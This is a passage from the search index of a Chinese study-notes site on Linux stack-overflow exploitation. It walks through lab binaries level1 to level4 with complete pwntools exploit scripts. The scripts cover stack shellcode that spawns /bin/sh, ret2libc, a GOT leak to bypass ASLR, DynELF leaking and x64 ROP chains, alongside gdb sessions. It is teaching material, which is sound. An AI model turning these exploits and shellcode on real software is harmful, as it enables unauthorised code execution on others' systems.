\u8fd9\u91cc\u6ce8\u610f\u7684\u662f\u7528gdb\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u7136\u540e\u67e5\u5185\u5b58\u6765\u786e\u5b9a\u7684shellcode\u6240\u5728\u4f4d\u7f6e\uff0c\u662f\u9519\u8bef\u7684\u3002\u56e0\u4e3agdb\u4f1a\u5f71\u54cdbuf\u7684\u5185\u5b58\u4f4d\u7f6e\uff0c\u5373\u4f7f\u662f\u5173\u95edALSR\u3002\u89e3\u51b3\u529e\u6cd5\u4e4b\u4e00\u5c31\u662f\u5f00\u542f core dump ulimit -c unlimited sudo sh -c 'echo \"/tmp/core.%t\" > /proc/sys/kernel/core_pattern' \u5f00\u542f\u4e4b\u540e\uff0c\u518d\u6b21\u8f93\u5165\u6d4b\u8bd5\u5b57\u7b26\u4e32\uff08\u6216\u957f\u5ea6\u5927\u4e8e144\u7684\u5b57\u7b26\u4e32\uff09\uff0c\u56e0\u6b64\u7a0b\u5e8f\u5185\u5b58\u9519\u8bef\uff0c\u4f7f\u7cfb\u7edf\u5728 /tmp \u751f\u6210\u4e00\u4e2a core dump \u6587\u4ef6\u3002\u7528gdb\u67e5\u770b\u8fd9\u4e2acore\u6587\u4ef6\u5f97\u5230\u771f\u6b63\u7684buf\u5730\u5740\uff08\u672c\u673a\u662f0xffffcec0\uff0c\u6bcf\u53f0\u673a\u4e0d\u4e00\u6837\uff0c\u8bf7\u5b9e\u9645\u64cd\u4f5c\u4e00\u4e0b\uff09\u3002 \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 #encoding:utf-8 from pwn import * context . log_level = 'debug' p = process ( \"./level1\" ) ret_address = 0xffffcec0 # \u8bf7\u4fee\u6539\u4e3a\u4f60\u83b7\u53d6\u7684shellcode\u6240\u5728\u7684\u5185\u5b58\u5730\u5740 # shellcode \u53ef\u4ee5\u7528msf\u751f\u6210\uff0c\u6216\u8005\u53bbgithub\u627e\u4e00\u4e2a\uff0c\u6ce8\u610f\u957f\u5ea6! shellcode = \" \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73 \" shellcode += \" \\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0 \" shellcode += \" \\x0b\\xcd\\x80 \" payload = shellcode + 'a' * ( 0x88 + 0x4 - len ( shellcode )) + p32 ( ret_address ) p . send ( payload ) p . interactive () # \u91ca\u653e\u63a7\u5236\u6743 \u6709\u53ef\u80fd\u811a\u672c\u8fd8\u662f\u4e0d\u80fd\u6210\u529fgetshell\uff0c\u5f88\u5927\u6982\u7387\u662fret\u7684\u5730\u5740\u9519\u4e86\u3002\u6211\u4eec\u518d\u4e00\u6b21\u67e5\u627e\u5730\u5740\uff0c\u8fd9\u6b21\u52a0\u8f7d\u7684\u6700\u65b0\u7684core\u6587\u4ef6\uff08\u540e\u7f00\u5927\u7684\uff09\u3002 \u66ff\u6362\u4e3a\u8be5\u5730\u5740\uff0c\u5373\u53ef\u3002 \u9664\u4e86\u672c\u5730\u8c03\u8bd5\uff0c\u8fd8\u6709\u8fdc\u7a0b\u90e8\u7f72\u7684\u65b9\u5f0f\uff0c\u5982\u4e0b\uff0c\u5c06\u9898\u76ee\u7ed1\u5b9a\u5230\u6307\u5b9a\u7aef\u53e3\u4e0a\uff1a socat tcp-l:10001,fork exec:./level1 payload\u9664\u4e86\u5c06p = process(\u201c./level1\u201d)\u6539\u4e3ap = remote(\u201c127.0.0.1\u201d, 10001)\u5916\uff0cret\u7684\u5730\u5740\u8fd8\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u89e3\u51b3\u65b9\u6cd5\u8fd8\u662f\u91c7\u7528\u751f\u6210core dump\u7684\u65b9\u6848\uff0c\u7136\u540e\u7528gdb\u8c03\u8bd5core\u6587\u4ef6\u83b7\u53d6\u8fd4\u56de\u5730\u5740\uff0c\u5373\u53ef\u8fdc\u7a0bgetshell\u3002","title":"level 1 - \u6808\u4e0a\u6267\u884cshellcode"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-2-ret2libc-dep","text":"\u4f7f\u7528 checksec \u68c0\u67e5\u9898\u76ee level2 \uff0c\u53d1\u73b0\u6253\u5f00\u4e86NX\u4fdd\u62a4\uff08\u6808\u4e0d\u53ef\u6267\u884c\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u80fd\u50cf\u4e0a\u4e00\u9898\u5c06shellcode\u5199\u5230\u6808\u4e0a\u540e\u6267\u884c\u3002 \u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528\u51fd\u6570\u5e93 libc.so \uff0c\u800cshellcode\u7684\u6267\u884c\u6548\u679c\u7b49\u4e8e system(\"/bin/sh\") \uff0c\u95ee\u9898\u5c31\u662f\u5982\u4f55\u83b7\u5f97system\u548c\"/bin/sh\"\u7684\u5730\u5740\u3002 \u6211\u4eec\u5173\u95ed\u4e86\u7cfb\u7edf\u7684ASLR\uff0c\u51fd\u6570\u5728\u5185\u5b58\u7684\u5730\u5740\u4e0d\u4f1a\u53d8\u6362\uff0c\u5b57\u7b26\u4e32\u4e5f\u662f\u56fa\u5b9a\u7684\u3002\u8fd9\u65f6\u53ef\u4ee5\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\uff0c\u901a\u8fc7 print \u548c find \u547d\u4ee4\u67e5\u627e\u3002 gdb\u6253\u5f00\u540e\uff0c\u9996\u5148\u5728main\u51fd\u6570\u4e0a\u6253\u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u8fd0\u884c\u7a0b\u5e8f\uff0c\u8ba9libc.so\u51fd\u6570\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u4f7f\u7528 print system \u83b7\u53d6system\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\uff1b\u4f7f\u7528 print __libc_start_main \u83b7\u53d6libc.so\u8d77\u59cb\u5730\u5740\u3002\u4f7f\u7528 find [\u8d77\u59cb\u5730\u5740],[+\u641c\u7d22\u957f\u5ea6],[\u5b57\u7b26\u4e32] \u83b7\u53d6\"/bin/sh\"\u5185\u5b58\u5730\u5740\u3002 $ gdb level2 '' ' gef\u27a4 b main Breakpoint 1 at 0x8048430 gef\u27a4 r Starting program: /home/skye/rop/level2/level2 Breakpoint 1 , 0x08048430 in main () gef\u27a4 print system $1 = { int ( const char * )} 0xf7e19200 <__libc_system> gef\u27a4 print __libc_start_main $2 = { int ( int ( * )( int, char **, char ** ) , int, char **, int ( * )( int, char **, char ** ) , void ( * )( void ) , void ( * )( void ) , void * )} 0xf7df4d90 <__libc_start_main> gef\u27a4 find 0xf7df4d90,+2200000, \"/bin/sh\" 0xf7f5a0cf warning: Unable to access 16000 bytes of target memory at 0xf7fb7cd7, halting search. 1 pattern found. \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 #coding:utf-8 from pwn import * context . log_level = 'debug' p = process ( \"./level2\" ) system_addr = 0xf7e19200 binsh_addr = 0xf7f5a0cf ret = 0xdeadbeef payload = 'a' * 140 + p32 ( system_addr ) + p32 ( ret ) + p32 ( binsh_addr ) p . send ( payload ) p . interactive ()","title":"level 2  - ret2libc \u7ed5\u8fc7 DEP \u9632\u62a4"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-2-rop-dep-aslr","text":"\u6253\u5f00ALSR\u4fdd\u62a4\uff1a sudo -s echo 2 > /proc/sys/kernel/randomize_va_space \u5f00ALSR\u4e4b\u540e\uff0c\u6211\u4eec\u6bcf\u6b21\u4ecegdb\u4e2d\u67e5\u627e\u7684\u5730\u5740\u90fd\u662f\u53d8\u5316\u7684\u3002\u4f46\u662f\u7a0b\u5e8f\u672c\u8eab\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u5e76\u4e0d\u662f\u968f\u673a\u7684\u3002\u5982\u56fe\u6240\u793a\uff1a \u601d\u8def\u662f\uff1a\u6211\u4eec\u6cc4\u9732\u51falibc.so\u67d0\u4e9b\u51fd\u6570\u5728\u5185\u5b58\u4e2d\u5730\u5740\uff0c\u7136\u540e\u5229\u7528\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\u5730\u5740\u6839\u636e\u51fd\u6570\u7684\u504f\u79fb\u91cf\u8ba1\u7b97\u5f97\u51fasystem()\u548c\"/bin/sh\"\u7684\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u6267\u884csystem(\"/bin/sh\") \u7531\u4e8e\u9898\u76ee\u6ca1\u6709\u7ed9\u51falibc.so\uff0c\u4f7f\u7528 ldd \u547d\u4ee4\u67e5\u8be2\u7a0b\u5e8f\u8c03\u7528\u7684\u51fd\u6570\u5e93\uff0c\u7136\u540e\u5c06\u51fd\u6570\u5e93\u6587\u4ef6\u62f7\u8d1d\u5f53\u524d\u76ee\u5f55 $ ldd level2 linux-gate.so.1 ( 0xf7fd4000 ) libc.so.6 = > /lib/i386-linux-gnu/libc.so.6 ( 0xf7ddc000 ) /lib/ld-linux.so.2 ( 0xf7fd6000 ) $ sudo cp /lib/i386-linux-gnu/libc.so.6 libc.so \u5229\u7528objdump\u67e5\u770b\u7a0b\u5e8f\u7684plt\u548cgot\u8868\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u80fd\u5148\u5229\u7528\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u51fd\u6570\uff0c\u53bb\u6cc4\u9732\u5bf9\u5e94\u7684\u5730\u5740\u3002\uff08\u56fe\u4e00.plt\u8868\uff0c\u56fe\u4e8c.got\u8868\uff09 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 write@plt() \u51fd\u6570\u628a\u5b58\u50a8\u5728 write@GLIBC_2.0 (\u6216\u79f0 write.got )\u7684 write() \u51fd\u6570\u7684\u5185\u5b58\u5730\u5740\u6253\u5370\u51fa\u6765\u3002\u7136\u540e\u8ba1\u7b97system()\u548c\"/bin/sh\"\u4e0ewrite()\u5728\u51fd\u6570\u5e93libc.so\u4e2d\u7684offset\uff08\u76f8\u5bf9\u5730\u5740\uff09\u5f97\u5230\u6700\u540e\u7684\u5730\u5740\u3002 Q: \u4e3a\u4ec0\u4e48\u7528\u7684\u662f\u8c03\u7528write@plt()\u6253\u5370write@got()\uff1f A: write() \u51fd\u6570\u5b9e\u73b0\u662f\u5728 libc.so \u5f53\u4e2d\uff0c\u90a3\u6211\u4eec\u8c03\u7528\u7684 write@plt() \u51fd\u6570\u4e3a\u4ec0\u4e48\u4e5f\u80fd\u5b9e\u73b0 write() \u529f\u80fd\u5462? \u8fd9\u662f\u56e0\u4e3alinux\u91c7\u7528\u4e86\u5ef6\u65f6\u7ed1\u5b9a\u6280\u672f\uff0c\u5f53\u6211\u4eec\u8c03\u7528 write@plit() \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u4f1a\u5c06\u771f\u6b63\u7684 write() \u51fd\u6570\u5730\u5740link\u5230got\u8868\u7684 write.got \u4e2d\uff0c\u7136\u540e write@plit() \u4f1a\u6839\u636e write.got \u8df3\u8f6c\u5230\u771f\u6b63\u7684 write() \u51fd\u6570\u4e0a\u53bb\u3002\uff08\u5982\u679c\u8fd8\u662f\u641e\u4e0d\u6e05\u695a\u7684\u8bdd\uff0c\u63a8\u8350\u9605\u8bfb\u300a\u7a0b\u5e8f\u5458\u7684\u81ea\u6211\u4fee\u517b - \u94fe\u63a5\u3001\u88c5\u8f7d\u4e0e\u5e93\u300b\u8fd9\u672c\u4e66\uff09 \u518d\u5c06pc\u6307\u9488return\u56de vulnerable_function() \u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884cret2libc\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u4e14\u8fd9\u4e00\u6b21\u6211\u4eec\u77e5\u9053\u4e86 system() \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 system() \u51fd\u6570\u6765\u83b7\u53d6\u6211\u4eec\u7684shell\u4e86\u3002 \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 # coding:utf-8 from pwn import * context . log_level = 'debug' elf = ELF ( \"./level2\" ) libc = ELF ( \"./libc.so\" ) p = process ( \"./level2\" ) write_plt = elf . symbols [ 'write' ] # \u83b7\u53d6\u7a0b\u5e8f\u4e2d\u7684write.plt write_got = elf . got [ 'write' ] # \u83b7\u53d6\u7a0b\u5e8f\u4e2d\u7684write.got vulfun_addr = 0x08048404 # \u6f0f\u6d1e\u51fd\u6570\u5730\u5740 payload_1 = 'a' * 140 + p32 ( write_plt ) + p32 ( vulfun_addr ) + p32 ( 1 ) + p32 ( write_got ) + p32 ( 4 ) p . send ( payload_1 ) write_addr = u32 ( p . recv ( 4 )) # \u63a5\u53d7\u8fd4\u56de\u7684\u5185\u5b58\u5730\u5740 libc_addr = write_addr - libc . symbols [ 'write' ] system_addr = libc_addr + libc . symbols [ 'system' ] binsh_addr = libc_addr + next ( libc . search ( '/bin/sh' )) # \u5bfb\u627e\u5b57\u7b26\u4e32\u5730\u5740 payload_2 = 'a' * 140 + p32 ( system_addr ) + p32 ( vulfun_addr ) + p32 ( binsh_addr ) p . send ( payload_2 ) p . interactive ()","title":"level 2  - \u901a\u8fc7 ROP \u7ed5\u8fc7 DEP \u548c ASLR \u9632\u62a4"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-2-libcsorop","text":"\u5982\u679c\u4e0d\u80fd\u83b7\u53d6\u76ee\u6807\u673a\u5668\u4e0a\u7684libc.so\u6216\u8005\u5177\u4f53\u7684linux\u7248\u672c\u53f7\uff0c\u5e94\u8be5\u600e\u4e48\u8ba1\u7b97\u5f97\u51fa\u504f\u79fb\u5730\u5740\uff08offset\uff09\uff1f \u5229\u7528DynELF\u6a21\u5757\u901a\u8fc7\u5185\u5b58\u6cc4\u9732(memory leak)\u6765\u641c\u7d22\u5185\u5b58\u4e2d\u7684system()\u5730\u5740\u3002\u9700\u8981\u7684\u662f\u4e00\u4e2a lead(address) \u51fd\u6570\u3002\u7531\u4e8eDynELF\u6a21\u5757\u53ea\u80fd\u53d6\u5f97system()\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u8c03\u7528read()\u6216\u5176\u4ed6\u51fd\u6570\uff0c\u5c06 /bin/sh \u5199\u5165\u5230\u7a0b\u5e8f\u7684\u975e\u968f\u673a\u6bb5\uff08\u5982.bss\u6bb5\uff09\u3002\u901a\u8fc7 readelf -S level2 \u6216\u8005\u5728IDA\u4e2d\u5feb\u6377\u952e ctrl+s \u83b7\u53d6\u5230bss\u6bb5\u7684\u5730\u5740\u3002 \u56e0\u4e3a\u6211\u4eec\u5728\u6267\u884c\u5b8cread()\u4e4b\u540e\u8981\u63a5\u7740\u8c03\u7528system(\u201c/bin/sh\u201d)\uff0c\u5e76\u4e14read()\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u6709\u4e09\u4e2a\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2apop pop pop ret\u7684gadget\u7528\u6765\u4fdd\u8bc1\u6808\u5e73\u8861\u3002\u5229\u7528\u7684\u662fROPgadget\u5de5\u5177\u5feb\u901f\u67e5\u627e\u53ef\u7528gadget\uff0c ROPgadget --binary level2 --only \"pop|ret\" \u653b\u51fb\u601d\u8def\uff1a\u9996\u5148\u901a\u8fc7DynELF\u83b7\u53d6\u5230system()\u5730\u5740\uff0c\u901a\u8fc7read()\u5c06\u201c/bin/sh\u201d\u5199\u5165\u5230.bss\u6bb5\uff0c\u901a\u8fc7gadget\u6e05\u7a7aread()\u6808\u4e0a\u53c2\u6570\u540e\uff0c\u8c03\u7528system(\"/bin/sh\")\u3002 \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 #coding = utf-8 from pwn import * elf = ELF ( './level2' ) plt_write = elf . symbols [ 'write' ] plt_read = elf . symbols [ 'read' ] vulfun_addr = 0x08048404 # \u8bf7\u6839\u636e\u5b9e\u9645\u800c\u66ff\u6362 bss_addr = 0x0804a018 # \u8bf7\u6839\u636e\u5b9e\u9645\u800c\u66ff\u6362 pppr = 0x080484bd # \u8bf7\u6839\u636e\u5b9e\u9645\u800c\u66ff\u6362 def leak ( address ): payload1 = 'a' * 140 + p32 ( plt_write ) + p32 ( vulfun_addr ) + p32 ( 1 ) + p32 ( address ) + p32 ( 4 ) p . send ( payload1 ) data = p . recv ( 4 ) print \" %#x => %s \" % ( address , ( data or '' ) . encode ( 'hex' )) return data p = process ( './level2' ) d = DynELF ( leak , elf = ELF ( './level2' )) system_addr = d . lookup ( 'system' , 'libc' ) print \"system_addr=\" + hex ( system_addr ) payload2 = 'a' * 140 + p32 ( plt_read ) + p32 ( pppr ) + p32 ( 0 ) + p32 ( bss_addr ) + p32 ( 8 ) # \u5199\u5165read\u90e8\u5206 payload2 += p32 ( system_addr ) + p32 ( vulfun_addr ) + p32 ( bss_addr ) # \u8c03\u7528system\u90e8\u5206 print \" \\n ###sending payload2 ...###\" p . send ( payload2 ) p . send ( \"/bin/sh \\0 \" ) p . interactive ()","title":"level 2  - \u5728\u4e0d\u83b7\u53d6\u76ee\u6807libc.so\u7684\u60c5\u51b5\u4e0b\u8fdb\u884cROP\u653b\u51fb"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#linux_64linux_86","text":"linux_64\u4e0elinux_86\u7684\u533a\u522b\u4e3b\u8981\u6709\u4e24\u70b9\uff1a \u9996\u5148\u662f\u5185\u5b58\u5730\u5740\u7684\u8303\u56f4\u753132\u4f4d\u53d8\u6210\u4e8664\u4f4d \u3002\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528\u7684\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e0x00007fffffffffff\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 \u5176\u6b21\u662f\u51fd\u6570\u53c2\u6570\u7684\u4f20\u9012\u65b9\u5f0f\u53d1\u751f\u4e86\u6539\u53d8 \uff0cx86\u4e2d\u53c2\u6570\u90fd\u662f\u4fdd\u5b58\u5728\u6808\u4e0a\uff0c\u4f46\u5728x64\u4e2d\u7684\u524d\u516d\u4e2a\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728RDI\uff0cRSI\uff0cRDX\uff0cRCX\uff0cR8\u548c R9\u4e2d\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002","title":"linux_64\u4e0elinux_86\u7684\u533a\u522b"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#x64","text":"","title":"x64\u7bc7"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-3-rop-dep-aslr","text":"\u8001\u6837\u5b50\uff0c\u5728\u6f0f\u6d1e\u51fd\u6570\u4e2d\uff0c\u5b58\u5728\u7740\u6808\u6ea2\u51fa\u3002\u7a0b\u5e8f\u4e2d\u4e5f\u6709\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570 callsystem \u3002\u601d\u8def\u5c31\u662f\u5229\u7528\u6808\u6ea2\u51fa\uff0c\u8986\u5199rip\u4e3a\u540e\u95e8\u51fd\u6570\u5185\u5b58\u5730\u5740 0x0000000000400584 \u3002 \u8fd9\u91cc\u8ba1\u7b97\u6ea2\u51fa\u9700\u8981\u7684\u8986\u5199\u957f\u5ea6\uff0c\u4e0d\u91c7\u53d6\u539f\u6587\u4e2d\u7684\u65b9\u6cd5\uff0c\u800c\u662f\u901a\u8fc7IDA\u5206\u6790\u8ba1\u7b97\u5f97\u51fa\uff0c\u5177\u4f53\u8ba1\u7b97\u5982\u4e0b\uff1a0x80 + 0x8 \u3002\u8986\u5199\u5b8c\u6210\u540e\u7684\u4f4d\u7f6e\u5230\u8fbe rip \u4e0a\u4e00\u4e2a\u5185\u5b58\u7a7a\u95f4\u3002 \u6700\u7ec8exp\u5982\u4e0b\uff1a #!python #!/usr/bin/env python from pwn import * elf = ELF ( 'level3' ) p = process ( './level3' ) #p = remote('127.0.0.1',10001) callsystem = 0x0000000000400584 payload = \"A\" * 136 + p64 ( callsystem ) p . send ( payload ) p . interactive ()","title":"level 3  -  \u901a\u8fc7 ROP \u7ed5\u8fc7 DEP \u548c ASLR \u9632\u62a4"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-4-ropgadgetgadgets","text":"x86 \u7684\u53c2\u6570\u90fd\u662f\u4fdd\u5b58\u5728\u6808\u4e0a\uff08\u5373\u6808\u4f20\u53c2\uff09\u3002\u800c x64 \u7684\u524d\u516d\u4e2a\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728RDI\u3001RSI\u3001RDX\u3001RCX\u3001R8 \u548c R9 \u5bc4\u5b58\u5668\u4e2d\uff0c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u624d\u4f1a\u4fdd\u5b58\u5230\u6808\u4e0a\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u9700\u8981\u4f20\u9012\u5c11\u91cf\u7684\u53c2\u6570\u5c31\u9700\u8981\u7528\u5230 gadget \u3002\u7b80\u5355\u7684 gadget \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4 objdump \u67e5\u627e\uff0c\u5982\u679c\u9700\u8981\u590d\u6742\u7684 gadget \u65f6\uff08\u6216\u8005\u8bf4\u66f4\u52a0\u5e38\u7528\u7684\uff09\uff0c\u5c31\u9700\u8981\u501f\u52a9\u8bf8\u5982 ROPgadget\u3001Ropper\u3001ROPEME \u7b49\u7b49\u67e5\u8be2\u5de5\u5177\u3002 \u4f7f\u7528\u547d\u4ee4 ROPgadget --binary level4 --only \"pop|ret\" \u641c\u7d22\u4e00\u4e0b level 4 \u4e2d\u6240\u6709 pop ret \u7684 gadget\u3002\u5c31\u8fd9\u4e2a\u7a0b\u5e8f\u800c\u8a00\uff0c\u592a\u5c0f\u4e86\uff0c\u627e\u4e0d\u5230 pop rdi;ret \u7684 gadget\u3002\uff08\u4e0d\u4fe1\u4f60\u8bd5\u8bd5XD\uff09 \u7531\u4e8e\u7a0b\u5e8f\u8c03\u7528\u4e86 libc.so \uff0c\u90a3\u6211\u4eec\u5c31\u67e5\u67e5 libc.so \u4e2d\u6709\u6ca1\u6709\u9700\u8981\u7684 gadget \u3002\u9996\u5148\uff0c\u9700\u8981\u5c06\u4f7f\u7528\u7684 libc \u590d\u5236\u5230\u5de5\u4f5c\u76ee\u5f55\u3002\u7136\u540e\u5728\u4f7f\u7528 ROPgadget \u67e5\u8be2\u3002\u627e\u5230gadget\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6784\u9020ROP\u94fe\u3002 # \u67e5\u8be2\u4f7f\u7528\u7684libc.so\u6240\u5728 ldd level4 # \u590d\u5236 & \u91cd\u547d\u540d sudo cp /lib/x86_64-linux-gnu/libc.so.6 libc.so ROPgadget --binary libc.so --only \"pop|ret\" \u200b ``` ( \u7701\u7565 ) 0x0000000000021102 : pop rdi ; ret \u200b ``` ( \u7701\u7565 ) \u5148\u586b\u5145\u6808\u7a7a\u95f4\uff0c\u5230\u8fbe rip \u4e0a\u4e00\u4e2a\u5185\u5b58\u7a7a\u95f4\u3002\u8986\u5199\u4e3agadget\u5730\u5740\uff0c\u518d\u63a5\u7740\u662f /bin/sh \u5185\u5b58\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5c06 /bin/sh \u5b58\u5165\u5230 rdi \u5bc4\u5b58\u5668\u3002\u7136\u540e\u8fd0\u884c\u6307\u9488\u518d\u8df3\u8f6c\u5230 rip+0x10 (\u5373system_addr\u88ab\u6211\u4eec\u5199\u5165\u7684\u4f4d\u7f6e)\uff0c\u6267\u884c system(\"/bin/sh\") \u3002\u6700\u7ec8\u6784\u6210\u7684ROP\u94fe\uff1a payload = \" \\x00 \" * 136 + p64 ( pop_ret_addr ) + p64 ( binsh_addr ) + p64 ( system_addr ) \u6700\u7ec8 exp \u6784\u9020\u5982\u4e0b\uff1a #!python #!/usr/bin/env python from pwn import * libc = ELF ( 'libc.so.6' ) p = process ( './level4' ) #p = remote('127.0.0.1',10001) binsh_addr_offset = next ( libc . search ( '/bin/sh' )) - libc . symbols [ 'system' ] print \"binsh_addr_offset = \" + hex ( binsh_addr_offset ) pop_ret_offset = 0x0000000000022a12 - libc . symbols [ 'system' ] print \"pop_ret_offset = \" + hex ( pop_ret_offset ) #pop_pop_call_offset = 0x00000000000f4739 - libc.symbols['system'] #print \"pop_pop_call_offset = \" + hex(pop_pop_call_offset) print \" \\n ##########receiving system addr########## \\n \" system_addr_str = p . recvuntil ( ' \\n ' ) system_addr = int ( system_addr_str , 16 ) print \"system_addr = \" + hex ( system_addr ) binsh_addr = system_addr + binsh_addr_offset print \"binsh_addr = \" + hex ( binsh_addr ) pop_ret_addr = system_addr + pop_ret_offset print \"pop_ret_addr = \" + hex ( pop_ret_addr ) #pop_pop_call_addr = system_addr + pop_pop_call_offset #print \"pop_pop_call_addr = \" + hex(pop_pop_call_addr) p . recv () payload = \" \\x00 \" * 136 + p64 ( pop_ret_addr ) + p64 ( binsh_addr ) + p64 ( system_addr ) #payload = \"\\x00\"*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) print \" \\n ##########sending payload########## \\n \" p . send ( payload ) p . interactive ()","title":"level 4 - 